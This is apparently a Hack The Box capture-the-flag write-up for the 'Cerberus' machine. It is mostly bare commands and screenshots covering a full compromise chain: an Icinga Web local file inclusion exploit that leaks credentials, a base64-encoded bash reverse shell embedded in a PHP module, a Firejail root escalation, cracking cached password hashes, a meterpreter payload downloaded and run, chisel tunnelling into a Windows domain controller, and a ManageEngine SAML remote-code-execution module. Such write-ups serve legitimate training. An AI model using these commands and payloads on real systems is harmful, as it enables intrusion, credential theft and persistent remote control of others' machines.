![image](https://github.com/regarmulia/HTB/assets/33616880/95578bdf-ec9f-41c4-a795-5eb68f9193d1)```
nmap -sS -sC -sV -T5 -Pn 10.10.11.205
```
![image](https://github.com/regarmulia/HTB/assets/33616880/8c945ce1-850e-47d9-b545-95e5d5be3b31)


```
nano /etc/hosts
http://icinga.cerberus.local:8080/icingaweb2/authentication/login
```
![image](https://github.com/regarmulia/HTB/assets/33616880/2e53b3ba-9d4e-4e19-94c4-3ad78b2a2c15)

![image](https://github.com/regarmulia/HTB/assets/33616880/330d7aaa-bfc3-4e35-b234-af77244c7bfb)


```
https://github.com/doosec101/CVE-2022-24716
python3 exploit.py -h
python3 exploit.py http://icinga.cerberus.local:8080/icingaweb2 /etc/icingaweb2/resources.ini
```
![image](https://github.com/regarmulia/HTB/assets/33616880/f53f8aae-4c25-4a22-8b45-a2deae71adcd)

![image](https://github.com/regarmulia/HTB/assets/33616880/c74c6800-1267-4351-b163-d5069f20811c)


```
OR ./lfi.py
username = "matthew"
password = "IcingaWebPassword2023"
```
![image](https://github.com/regarmulia/HTB/assets/33616880/9e630069-3f72-4fb8-bb30-1e3cba6b0812)


```
http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/resources.ini
```
![image](https://github.com/regarmulia/HTB/assets/33616880/e3587318-f571-491e-85bd-24cafc9f0401)


```
Login
```
![image](https://github.com/regarmulia/HTB/assets/33616880/d98c50cf-6cd1-4f19-955e-9eaf5ca00636)


```
openssl genrsa -out private-key.pem 1024
Configuration – Application: Create a New Resource
../../../../../../../../../../../../dev/shm/test.txt
```
![image](https://github.com/regarmulia/HTB/assets/33616880/7af4a30b-6f7d-4c21-a2e3-1a645d0f4ed9)

![image](https://github.com/regarmulia/HTB/assets/33616880/974644ba-82e3-4093-afd2-ad697a2418e6)


```
python3 exploit.py http://icinga.cerberus.local:8080/icingaweb2 /dev/shm/test.txt
```
![image](https://github.com/regarmulia/HTB/assets/33616880/6a42bef0-0852-4ac7-80ef-dd5f55e849f4)


```
echo "sh -i >& /dev/tcp/10.10.14.2/10001 0>&1" | base64 -w 0
../../../../../dev/shm/training/configuration.php
Module path: /dev/shm/
Triger: Click Access Control
python3 exploit.py http://icinga.cerberus.local:8080/icingaweb2 /dev/shm/training/configuration.php

<?php
{
         system("echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMi8xMDAwMSAwPiYxCg==|base64 -d|bash");
}
?>

-----BEGIN PRIVATE KEY-----
```
![image](https://github.com/regarmulia/HTB/assets/33616880/c09ce7c0-7fad-456d-9308-f70ce39597ae)

![image](https://github.com/regarmulia/HTB/assets/33616880/b1a9851d-72eb-4d0b-ad35-ec011a501987)

![image](https://github.com/regarmulia/HTB/assets/33616880/4fca906c-02ec-48c1-b086-916eae7c050f)

![image](https://github.com/regarmulia/HTB/assets/33616880/d5eac0cc-b163-43b3-98f2-6b27eeaf3c6d)


```
python3 -c 'import pty; pty.spawn("/bin/bash")’
find / -perm -4000 2>/dev/null
```
![image](https://github.com/regarmulia/HTB/assets/33616880/688e17cd-f90a-42c1-8c69-a402978553b9)


```
firejail --version
```
![image](https://github.com/regarmulia/HTB/assets/33616880/eab00318-12ec-4adb-af59-9a1bbde88edd)


```
https://www.openwall.com/lists/oss-security/2022/06/08/10/1
./firejoin.py
firejail --join=3089
su -
```
![image](https://github.com/regarmulia/HTB/assets/33616880/89365045-1e44-41f9-bc9c-e1c4d9001491)

![image](https://github.com/regarmulia/HTB/assets/33616880/ef258d83-9c59-49a2-946d-77ab18f30bc8)


```
ifconfig
```
![image](https://github.com/regarmulia/HTB/assets/33616880/7a8b416e-d9a2-4c83-b1f9-be1e52029a69)


```
ps aux | grep root
cd /var/lib/sss/db
strings cache_cerberus.local.ldb | sort -u | head
```
![image](https://github.com/regarmulia/HTB/assets/33616880/38531902-3ecb-4616-9d02-a58cf4d46ffb)

![image](https://github.com/regarmulia/HTB/assets/33616880/179029c1-fa5c-4a47-a931-d3e8ab92333a)


```
john hash -w=/usr/share/wordlists/rockyou.txt
147258369
```
![image](https://github.com/regarmulia/HTB/assets/33616880/9cddadc3-aca2-4127-b19f-3619563d7c67)


```
msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=10.10.14.2 lport=10002 -f elf -o shell
```
![image](https://github.com/regarmulia/HTB/assets/33616880/6d52758b-5933-43c3-bc7b-1478c3e2e3c0)


```
use exploit/multi/handler
run -j
use auxiliary/server/socks_proxy
run -j
```
![image](https://github.com/regarmulia/HTB/assets/33616880/ec61ef7d-8063-406f-8719-584f42e6477c)

![image](https://github.com/regarmulia/HTB/assets/33616880/e1e3def5-1d53-4c17-a068-22a19e6e0422)


```
nano /etc/proxychains4.conf
```
![image](https://github.com/regarmulia/HTB/assets/33616880/fc6d2901-4950-488f-9e9c-9b3bb4a3f630)


```
wget http://10.10.14.2:8000/shell
./shell &
```
![image](https://github.com/regarmulia/HTB/assets/33616880/302a4b0f-1430-41dc-8052-c06660d0754b)


```
use post/multi/manage/autoroute
```
![image](https://github.com/regarmulia/HTB/assets/33616880/0e76bcae-fb3e-4538-9966-4f88134f240d)


```
proxychains evil-winrm -i 172.16.22.1 -u matthew -p 147258369
```
![image](https://github.com/regarmulia/HTB/assets/33616880/098498bd-c8e9-44c9-b8a5-d9c638f91b42)

![image](https://github.com/regarmulia/HTB/assets/33616880/45d9133f-648b-4069-85aa-0307f783bcf2)


```
netstat -ano | select-string LIST
```
![image](https://github.com/regarmulia/HTB/assets/33616880/bfcdbe5d-933c-420f-8aec-bfa6fcc4d612)


```
cat /etc/hosts
```
![image](https://github.com/regarmulia/HTB/assets/33616880/aee0f466-efd5-4e27-b9f8-4e1f978dfe28)


```
git clone https://github.com/jpillora/chisel.git
```
![image](https://github.com/regarmulia/HTB/assets/33616880/8d2867a4-849c-4b95-87e5-274988b0c39c)


```
./chisel_1.9.0_linux_amd64 server --socks5 -p 6666 --reverse
```
![image](https://github.com/regarmulia/HTB/assets/33616880/a07718ca-c3fd-43fd-8d25-ff0d37b44b1e)


```
iwr('http://10.10.14.2:8000/chisel_1.9.0_windows_amd64') -outfile chisel.exe
start-process -filepath .\chisel.exe -args "client 10.10.14.2:6666 R:8888:socks"
```
![image](https://github.com/regarmulia/HTB/assets/33616880/c0ccfeea-234e-4df4-aa22-0a06f8bbeaad)


```
nano /etc/proxychains4.conf
```
![image](https://github.com/regarmulia/HTB/assets/33616880/eb447332-f655-4c71-8aba-ed609456a2d5)


```
New SOCKS proxy
```
![image](https://github.com/regarmulia/HTB/assets/33616880/794c406e-f983-4efb-bba8-209f943e474a)


```
https://dc.cerberus.local:9251
https://dc.cerberus.local/adfs/ls/?SAMLRequest=pVNNj9owFLz3V0S%2Bky8cEizCikJXRWLbCLI99FI5zgtrybGp7bDsv1%2BHjy2tWiq1J0v2vPfmzYwnd4dWeHvQhiuZo8gPkQeSqZrLbY4ey%2FtBhu6m7yaGtiLekVlnn%2BQavndgrDczBrR1dXMlTdeC3oDecwaP61WOnqzdGRIEizkZx0kU9A1WastlMEppVkdhNBqHOIxrNqKjFOMqa1hGU0Yjyposq%2BIGeQs3hUtqj9QuDWvmM9AV6M74QjEqAlo3JhAmQN5ykaNvuKrjCqc4TcIhhCHgJMVxQtNkNB5inEQOZkwHS2kslTZHcRgPB2E2iKMyzEiECR77KY6%2BIq%2FQyiqmxHsuT3p0WhJFDTdE0hYMsYxsZg8rEvshqU4gQz6WZTEoPm%2FKY4M9r0F%2FcugcPVBJt%2FBBOhHAmy02IJqzYl4hOoO8Lxcb4t4GZ4w05CT87dG7M080PflEjgtq717pltrbtf0NrwfNEUpAWm5ffpp9u5xeMoCm%2F%2B%2F4JLimP72ErldvuSiU4OzFmwmhnucaqHWKWt0B%2BuuakR%2F9smYnzQ4YbzjUKHibc8411MeUu1BbOFhvrtod1dz0vsCBMvum8jVsLpwSa2j%2BSbmbMEZY39tdF%2B54VrruYwnM8Sw1dYsobS%2FC%2FY7R9Pz4h%2F1%2BPF%2F%2F7ekr&RelayState=aHR0cHM6Ly9EQzo5MjUxL3NhbWxMb2dpbi9MT0dJTl9BVVRI
```
![image](https://github.com/regarmulia/HTB/assets/33616880/78030abe-deeb-41b7-8034-3e171fb53f57)


```
wget https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966.rb
```


```
cd "C:\program files (x86)\manageengine\ADSelfService Plus\backup“
download OfflineBackup_20230214064809.ezip
```
![image](https://github.com/regarmulia/HTB/assets/33616880/4013981f-0825-4bc6-8fd0-bff4eee746c2)


```
7z x OfflineBackup_20230214064809.ezip
grep -i issuer_url *
```
![image](https://github.com/regarmulia/HTB/assets/33616880/b8aaa3ce-a802-41da-abaf-b9ba871c8ddc)

![image](https://github.com/regarmulia/HTB/assets/33616880/c9023ba0-590d-4291-9e3a-b1ed9672e5dc)


